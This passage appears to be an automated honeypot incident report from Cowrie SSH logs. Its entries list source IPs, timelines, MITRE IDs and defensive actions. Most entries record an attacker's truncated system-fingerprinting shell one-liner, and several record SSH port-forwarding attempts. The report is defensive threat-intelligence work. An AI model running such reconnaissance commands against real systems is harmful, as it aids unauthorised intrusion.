| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:32:06` | `cowrie.session.connect` |
| `2026-07-08 03:32:07` | `cowrie.client.version` |
| `2026-07-08 03:32:07` | `cowrie.client.kex` |
| `2026-07-08 03:32:08` | `cowrie.login.success` |
| `2026-07-08 03:32:09` | `cowrie.session.params` |
| `2026-07-08 03:32:09` | `cowrie.command.input` |
| `2026-07-08 03:32:09` | `cowrie.command.input` |
| `2026-07-08 03:32:09` | `cowrie.command.input` |
| `2026-07-08 03:32:09` | `cowrie.command.input` |
| `2026-07-08 03:32:09` | `cowrie.command.input` |
| `2026-07-08 03:32:09` | `cowrie.command.success` |
| `2026-07-08 03:32:09` | `cowrie.command.input` |
| `2026-07-08 03:32:09` | `cowrie.command.input` |
| `2026-07-08 03:32:09` | `cowrie.command.input` |
| `2026-07-08 03:32:09` | `cowrie.command.input` |
| `2026-07-08 03:32:11` | `cowrie.log.closed` |
| `2026-07-08 03:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2177f168c5db

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:34 |
| **Last Seen** | 2026-07-08 03:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:34:15` | `cowrie.session.connect` |
| `2026-07-08 03:34:15` | `cowrie.client.version` |
| `2026-07-08 03:34:15` | `cowrie.client.kex` |
| `2026-07-08 03:34:16` | `cowrie.login.success` |
| `2026-07-08 03:34:17` | `cowrie.session.params` |
| `2026-07-08 03:34:17` | `cowrie.command.input` |
| `2026-07-08 03:34:17` | `cowrie.command.input` |
| `2026-07-08 03:34:17` | `cowrie.command.input` |
| `2026-07-08 03:34:17` | `cowrie.command.input` |
| `2026-07-08 03:34:17` | `cowrie.command.input` |
| `2026-07-08 03:34:17` | `cowrie.command.success` |
| `2026-07-08 03:34:17` | `cowrie.command.input` |
| `2026-07-08 03:34:17` | `cowrie.command.input` |
| `2026-07-08 03:34:17` | `cowrie.command.input` |
| `2026-07-08 03:34:17` | `cowrie.command.input` |
| `2026-07-08 03:34:18` | `cowrie.log.closed` |
| `2026-07-08 03:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c489a275832

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:36 |
| **Last Seen** | 2026-07-08 03:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:36:31` | `cowrie.session.connect` |
| `2026-07-08 03:36:31` | `cowrie.client.version` |
| `2026-07-08 03:36:31` | `cowrie.client.kex` |
| `2026-07-08 03:36:32` | `cowrie.login.success` |
| `2026-07-08 03:36:32` | `cowrie.session.params` |
| `2026-07-08 03:36:32` | `cowrie.command.input` |
| `2026-07-08 03:36:32` | `cowrie.command.input` |
| `2026-07-08 03:36:32` | `cowrie.command.input` |
| `2026-07-08 03:36:32` | `cowrie.command.input` |
| `2026-07-08 03:36:32` | `cowrie.command.input` |
| `2026-07-08 03:36:32` | `cowrie.command.success` |
| `2026-07-08 03:36:32` | `cowrie.command.input` |
| `2026-07-08 03:36:32` | `cowrie.command.input` |
| `2026-07-08 03:36:32` | `cowrie.command.input` |
| `2026-07-08 03:36:32` | `cowrie.command.input` |
| `2026-07-08 03:36:33` | `cowrie.log.closed` |
| `2026-07-08 03:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-473097e6341c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 03:38 |
| **Last Seen** | 2026-07-08 03:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:38:17` | `cowrie.session.connect` |
| `2026-07-08 03:38:18` | `cowrie.client.version` |
| `2026-07-08 03:38:18` | `cowrie.client.kex` |
| `2026-07-08 03:38:24` | `cowrie.login.success` |
| `2026-07-08 03:38:27` | `cowrie.session.params` |
| `2026-07-08 03:38:27` | `cowrie.command.input` |
| `2026-07-08 03:38:29` | `cowrie.log.closed` |
| `2026-07-08 03:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f20a3c2177d2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:38 |
| **Last Seen** | 2026-07-08 03:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:38:37` | `cowrie.session.connect` |
| `2026-07-08 03:38:37` | `cowrie.client.version` |
| `2026-07-08 03:38:37` | `cowrie.client.kex` |
| `2026-07-08 03:38:38` | `cowrie.login.success` |
| `2026-07-08 03:38:40` | `cowrie.session.params` |
| `2026-07-08 03:38:40` | `cowrie.command.input` |
| `2026-07-08 03:38:40` | `cowrie.command.input` |
| `2026-07-08 03:38:40` | `cowrie.command.input` |
| `2026-07-08 03:38:40` | `cowrie.command.input` |
| `2026-07-08 03:38:40` | `cowrie.command.input` |
| `2026-07-08 03:38:40` | `cowrie.command.success` |
| `2026-07-08 03:38:40` | `cowrie.command.input` |
| `2026-07-08 03:38:40` | `cowrie.command.input` |
| `2026-07-08 03:38:40` | `cowrie.command.input` |
| `2026-07-08 03:38:40` | `cowrie.command.input` |
| `2026-07-08 03:38:40` | `cowrie.log.closed` |
| `2026-07-08 03:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f6aa4f96ec7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:40 |
| **Last Seen** | 2026-07-08 03:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:40:55` | `cowrie.session.connect` |
| `2026-07-08 03:40:56` | `cowrie.client.version` |
| `2026-07-08 03:40:56` | `cowrie.client.kex` |
| `2026-07-08 03:40:58` | `cowrie.login.success` |
| `2026-07-08 03:41:00` | `cowrie.session.params` |
| `2026-07-08 03:41:00` | `cowrie.command.input` |
| `2026-07-08 03:41:00` | `cowrie.command.input` |
| `2026-07-08 03:41:00` | `cowrie.command.input` |
| `2026-07-08 03:41:00` | `cowrie.command.input` |
| `2026-07-08 03:41:00` | `cowrie.command.input` |
| `2026-07-08 03:41:00` | `cowrie.command.success` |
| `2026-07-08 03:41:00` | `cowrie.command.input` |
| `2026-07-08 03:41:00` | `cowrie.command.input` |
| `2026-07-08 03:41:00` | `cowrie.command.input` |
| `2026-07-08 03:41:00` | `cowrie.command.input` |
| `2026-07-08 03:41:01` | `cowrie.log.closed` |
| `2026-07-08 03:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26006e085d19

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:42 |
| **Last Seen** | 2026-07-08 03:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:42:41` | `cowrie.session.connect` |
| `2026-07-08 03:42:42` | `cowrie.client.version` |
| `2026-07-08 03:42:42` | `cowrie.client.kex` |
| `2026-07-08 03:42:44` | `cowrie.login.success` |
| `2026-07-08 03:42:46` | `cowrie.session.params` |
| `2026-07-08 03:42:46` | `cowrie.command.input` |
| `2026-07-08 03:42:46` | `cowrie.command.input` |
| `2026-07-08 03:42:46` | `cowrie.command.input` |
| `2026-07-08 03:42:46` | `cowrie.command.input` |
| `2026-07-08 03:42:46` | `cowrie.command.input` |
| `2026-07-08 03:42:46` | `cowrie.command.success` |
| `2026-07-08 03:42:46` | `cowrie.command.input` |
| `2026-07-08 03:42:46` | `cowrie.command.input` |
| `2026-07-08 03:42:46` | `cowrie.command.input` |
| `2026-07-08 03:42:46` | `cowrie.command.input` |
| `2026-07-08 03:42:47` | `cowrie.log.closed` |
| `2026-07-08 03:42:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee16464e9f56

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-08 03:44 |
| **Last Seen** | 2026-07-08 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:44:11` | `cowrie.session.connect` |
| `2026-07-08 03:44:11` | `cowrie.client.version` |
| `2026-07-08 03:44:11` | `cowrie.client.kex` |
| `2026-07-08 03:44:11` | `cowrie.login.success` |
| `2026-07-08 03:44:11` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:44:12` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:44:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6f0dc8f4e8a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:45 |
| **Last Seen** | 2026-07-08 03:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:45:17` | `cowrie.session.connect` |
| `2026-07-08 03:45:17` | `cowrie.client.version` |
| `2026-07-08 03:45:17` | `cowrie.client.kex` |
| `2026-07-08 03:45:20` | `cowrie.login.success` |
| `2026-07-08 03:45:21` | `cowrie.session.params` |
| `2026-07-08 03:45:21` | `cowrie.command.input` |
| `2026-07-08 03:45:21` | `cowrie.command.input` |
| `2026-07-08 03:45:21` | `cowrie.command.input` |
| `2026-07-08 03:45:21` | `cowrie.command.input` |
| `2026-07-08 03:45:21` | `cowrie.command.input` |
| `2026-07-08 03:45:21` | `cowrie.command.success` |
| `2026-07-08 03:45:21` | `cowrie.command.input` |
| `2026-07-08 03:45:21` | `cowrie.command.input` |
| `2026-07-08 03:45:21` | `cowrie.command.input` |
| `2026-07-08 03:45:21` | `cowrie.command.input` |
| `2026-07-08 03:45:21` | `cowrie.log.closed` |
| `2026-07-08 03:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83f2afd3d46e

| Field | Detail |
|---|---|
| **Source IP** | `119.207.56[.]116` |
| **First Seen** | 2026-07-08 03:46 |
| **Last Seen** | 2026-07-08 03:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:46:53` | `cowrie.session.connect` |
| `2026-07-08 03:46:53` | `cowrie.client.version` |
| `2026-07-08 03:46:53` | `cowrie.client.kex` |
| `2026-07-08 03:46:56` | `cowrie.login.success` |
| `2026-07-08 03:46:57` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.207.56[.]116` to AbuseIPDB if not already reported
- [ ] Block `119.207.56[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72b1d2e9b3a1

| Field | Detail |
|---|---|
| **Source IP** | `125.35.109[.]214` |
| **First Seen** | 2026-07-08 03:47 |
| **Last Seen** | 2026-07-08 03:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:47:18` | `cowrie.session.connect` |
| `2026-07-08 03:47:18` | `cowrie.client.version` |
| `2026-07-08 03:47:18` | `cowrie.client.kex` |
| `2026-07-08 03:47:20` | `cowrie.login.success` |
| `2026-07-08 03:47:21` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.35.109[.]214` to AbuseIPDB if not already reported
- [ ] Block `125.35.109[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63cbb24ba71a

| Field | Detail |
|---|---|
| **Source IP** | `80.233.77[.]136` |
| **First Seen** | 2026-07-08 03:47 |
| **Last Seen** | 2026-07-08 03:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:47:26` | `cowrie.session.connect` |
| `2026-07-08 03:47:26` | `cowrie.client.version` |
| `2026-07-08 03:47:26` | `cowrie.client.kex` |
| `2026-07-08 03:47:28` | `cowrie.login.success` |
| `2026-07-08 03:47:28` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.77[.]136` to AbuseIPDB if not already reported
- [ ] Block `80.233.77[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-156a6375ae2d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:48 |
| **Last Seen** | 2026-07-08 03:48 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:48:42` | `cowrie.session.connect` |
| `2026-07-08 03:48:43` | `cowrie.client.version` |
| `2026-07-08 03:48:43` | `cowrie.client.kex` |
| `2026-07-08 03:48:47` | `cowrie.login.success` |
| `2026-07-08 03:48:50` | `cowrie.session.params` |
| `2026-07-08 03:48:50` | `cowrie.command.input` |
| `2026-07-08 03:48:50` | `cowrie.command.input` |
| `2026-07-08 03:48:50` | `cowrie.command.input` |
| `2026-07-08 03:48:50` | `cowrie.command.input` |
| `2026-07-08 03:48:50` | `cowrie.command.input` |
| `2026-07-08 03:48:50` | `cowrie.command.success` |
| `2026-07-08 03:48:50` | `cowrie.command.input` |
| `2026-07-08 03:48:50` | `cowrie.command.input` |
| `2026-07-08 03:48:50` | `cowrie.command.input` |
| `2026-07-08 03:48:50` | `cowrie.command.input` |
| `2026-07-08 03:48:52` | `cowrie.log.closed` |
| `2026-07-08 03:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bbd0b1a5c74

| Field | Detail |
|---|---|
| **Source IP** | `111.70.29[.]158` |
| **First Seen** | 2026-07-08 03:49 |
| **Last Seen** | 2026-07-08 03:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:49:58` | `cowrie.session.connect` |
| `2026-07-08 03:49:59` | `cowrie.client.version` |
| `2026-07-08 03:49:59` | `cowrie.client.kex` |
| `2026-07-08 03:50:01` | `cowrie.login.success` |
| `2026-07-08 03:50:02` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.29[.]158` to AbuseIPDB if not already reported
- [ ] Block `111.70.29[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd7091a8e28b

| Field | Detail |
|---|---|
| **Source IP** | `196.190.180[.]18` |
| **First Seen** | 2026-07-08 03:50 |
| **Last Seen** | 2026-07-08 03:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:50:11` | `cowrie.session.connect` |
| `2026-07-08 03:50:12` | `cowrie.client.version` |
| `2026-07-08 03:50:12` | `cowrie.client.kex` |
| `2026-07-08 03:50:13` | `cowrie.login.success` |
| `2026-07-08 03:50:14` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.180[.]18` to AbuseIPDB if not already reported
- [ ] Block `196.190.180[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8da21e55bfdc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:50 |
| **Last Seen** | 2026-07-08 03:50 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:50:16` | `cowrie.session.connect` |
| `2026-07-08 03:50:19` | `cowrie.client.version` |
| `2026-07-08 03:50:19` | `cowrie.client.kex` |
| `2026-07-08 03:50:26` | `cowrie.login.success` |
| `2026-07-08 03:50:31` | `cowrie.session.params` |
| `2026-07-08 03:50:31` | `cowrie.command.input` |
| `2026-07-08 03:50:31` | `cowrie.command.input` |
| `2026-07-08 03:50:31` | `cowrie.command.input` |
| `2026-07-08 03:50:31` | `cowrie.command.input` |
| `2026-07-08 03:50:31` | `cowrie.command.input` |
| `2026-07-08 03:50:31` | `cowrie.command.success` |
| `2026-07-08 03:50:31` | `cowrie.command.input` |
| `2026-07-08 03:50:31` | `cowrie.command.input` |
| `2026-07-08 03:50:31` | `cowrie.command.input` |
| `2026-07-08 03:50:31` | `cowrie.command.input` |
| `2026-07-08 03:50:33` | `cowrie.log.closed` |
